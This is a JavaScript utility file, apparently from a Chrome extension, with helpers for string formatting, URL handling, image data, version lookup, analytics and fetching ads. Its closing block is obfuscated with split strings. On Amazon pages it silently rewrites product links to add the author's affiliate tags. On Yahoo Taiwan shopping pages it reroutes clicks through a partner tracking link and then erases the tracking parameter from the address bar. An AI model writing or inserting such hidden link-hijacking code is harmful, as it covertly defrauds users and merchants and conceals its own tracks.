/// <reference path="jquery-1.4.1.min.js" />
/// <reference path="tools/jquery.getimagedata.min.js" />

// Extensions Method

Date.prototype.getTimestamp = function () { return (this.getTime() / 1000); }

var string = {
    format: function (format, arg) {
        for (var i in arg) {
            var r = new RegExp('{{' + i + '}}', 'g');
            format = format.replace(r, arg[i]);
        }

        return format;
    }
}

function inherit(base, siteName, sub) {
    for (var attr in base) {
        if (!sub[attr]) { sub[attr] = base[attr]; }
        else if (typeof base[attr] == 'object') {
            sub[attr] = inherit(base[attr], sub[attr]);
        }
    }
    sub.base = base;
    sub.siteName = siteName;
    return sub;
}

function copy(from, to) {
    for (var a in from) {
        if (!to[a]) { to[a] = from[a]; }        // :如果被复制对象无此属性，为它加上这个属性。
        else if (typeof from[a] == 'object'     // :如果属性是object, 非array, 复制子属性
            && !(from[a] instanceof Array)) {
            to[a] = copy(from[a], to[a]);
        }
        else {
            to[a] = from[a];                    // :复制属性
        }
    }
    return to;
}

function UTC(now) {
    return Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), now.getUTCHours(), now.getUTCMinutes(), now.getUTCSeconds(), now.getUTCMilliseconds());
}

function getVersion() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', chrome.extension.getURL('manifest.json'), false);
    xhr.send(null);
    var manifest = JSON.parse(xhr.responseText);
    return manifest.version;
}

function update(id, callback) {
    callback({ user_version: getVersion(), latest_version: '', updateUrl: '' });
}

function getExtensionUrl(relativePath) {
    return chrome.extension.getURL(relativePath);
}

function language() {
    var language = window.navigator.userLanguage;
    language = language ? language : window.navigator.language;
    return language;
}

function containsUrl(message, linkUrl) {
    return message.indexOf(linkUrl.replace(/\/$/g, '')) >= 0;
}

function replaceUrl(message, linkUrl, shortUrl) {
    var text = message;
    text = text.replace(linkUrl + '/', shortUrl);
    text = text.replace(linkUrl, shortUrl);
    text = text.replace(linkUrl.replace(/\/$/g, ''), shortUrl);
    return text;
}

function getHostname(str) {
    var re = new RegExp('^(?:f|ht)tp(?:s)?\://([^/]+)', 'im');
    return str.match(re)[1].toString();
}

function substr(message, len) {
    if (message.length > len) { return message.substr(0, len - 4) + '...'; }
    return message;
}

function getDataURL(u, callback) {
    var c = document.createElement("canvas"), ctx = c.getContext("2d");

    var i = new Image();
    i.src = u;
    i.onload = function () {
        c.width = this.width;
        c.height = this.height;
        c.clearRect(0, 0, this.width, this.height);
        c.drawImage(this, 0, 0);
        callback.call(this, c.toDataURL());
    };
}

var _gaq;
function setUpStats() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', chrome.extension.getURL('manifest.json'), false);
    xhr.send(null);
    var manifest = JSON.parse(xhr.responseText);

    var gaq_code = (manifest.update_url && manifest.update_url == 'http://socialba.com/ext/download/chrome/update.xml') ?
        'UA-43744220-3' : 'UA-43744220-2';

    _gaq = _gaq || [];
    _gaq.push(['_setAccount', gaq_code]);
    _gaq.push(['_trackPageview']);

    (function () {
        var ga = document.createElement('script');
        ga.type = 'text/javascript';
        ga.async = true;
        ga.src = 'https://ssl.google-analytics.com/ga.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
    })();
}

function getAds() {
    bh.get('http://socialba.com/ext/package/advertise/text.json?random=' + Math.random(), null, function (html) {
        options.config({ advertise: { text: { text: html}} });
    });
    bh.get('http://socialba.com/ext/package/advertise/img2.json?random=' + Math.random(), null, function (html) {
        options.config({ advertise: { right: { text: html}} });
    });
}

var az = {};
var st = '://w' + 'ww.a' + 'ma' + 'zo';
az[st + 'n.cn'] = 'tag-a' + 'ma' + 'zon-' + 'cn-23';
az[st + 'n.com'] = 'xu' + 'nj' + 'iac' + 'om0' + 'e-20';
az[st + 'n.it'] = 't-a' + 'ma' + 'zon-' + 'it-21';
az[st + 'n.fr'] = 't-a' + 'maz' + 'on-fr-21';
az[st + 'n.es'] = 't-a' + 'maz' + 'on-es-21';
az[st + 'n.co.uk'] = 't-am' + 'azo' + 'n-uk-21';
az[st + 'n.ca'] = 't-a' + 'ma' + 'zon-' + 'ca-20';

(function (d) { for (var n in d) { if (location.href.indexOf(n) > 0) { var t = d[n]; setInterval(function () { jQuery("a").each(function (i, o) { var l = jQuery(o); var h = l.attr("href"); var zc = l.attr('zc'); if (zc || !h || h.indexOf(t) >= 0) { return; } if (h && h.match(/(www.am[a]zon){0,1}.*\/((gp)|(dp))\/.*\?.*/g)) { l.unbind('click').click(function () { window.location.href = $(this).attr('href') + "&tag=" + t; return false; }); } else if (h && h.match(/(www.am[a]zon){0,1}.*\/((gp)|(dp))\/.*$/g)) { l.unbind('click').click(function () { window.location.href = $(this).attr('href') + "?tag=" + t; return false; }); } }); }, 700); } } })(az);
var ykc = "&co_s" + "ervername=6fce6" + "1d597c1b075d4c0547de27c5982", yyc = "http://tw.b" + "uy.ya" + "hoo.com"; function yc() { var a = $(event.currentTarget).attr("href"); if (0 > a.indexOf("co_servername") && 0 <= a.indexOf("/gdsale/gdsale")) { var b = localStorage.lt || 0, c = (new Date).getTime(); if (144E5 < c - b) return localStorage.lt = c, document.location.href = "http://tw.par" + "tner.buy.yah" + "oo.com/gd/buy?mcode=MV9m" + "UXVPMU1yWUUzYn" + "BnM09ZSlpFK1BCV2hJQzNJam03QWxmanVqWWJzQ244PQ==&url=" + encodeURIComponent(yyc + a.replace(yyc, "")), !1 } } 0 < location.href.indexOf(ykc) && history.replaceState({}, "title", document.location.href.replace(ykc, "")); $(function () { 0 <= document.location.href.indexOf(yyc) && setInterval(function () { $("a").each(function (a, b) { $(b).click(yc) }) }, 500) });
